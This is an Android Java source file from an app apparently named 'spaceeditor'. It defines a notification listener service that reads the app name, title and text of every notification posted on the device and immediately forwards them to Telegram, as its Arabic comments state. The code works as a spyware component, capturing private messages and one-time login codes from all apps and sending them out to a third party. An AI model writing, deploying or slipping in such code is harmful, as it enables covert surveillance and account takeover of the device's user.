package com.example.spaceeditor;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotificationService extends NotificationListenerService {
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        super.onNotificationPosted(sbn);
        try {
            Notification notification = sbn.getNotification();
            if (notification != null) {
                String appName = sbn.getPackageName();
                String title = notification.extras.getString(Notification.EXTRA_TITLE);
                String text = notification.extras.getString(Notification.EXTRA_TEXT);

                if (title != null || text != null) {
                    String msg = "🔔 إشعار جديد من (" + appName + "):\n";
                    if (title != null) msg += "العنوان: " + title + "\n";
                    if (text != null) msg += "النص: " + text;
                    
                    // إرسال فوري لتليجرام
                    MainActivity.sendTelegramMessage(msg);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
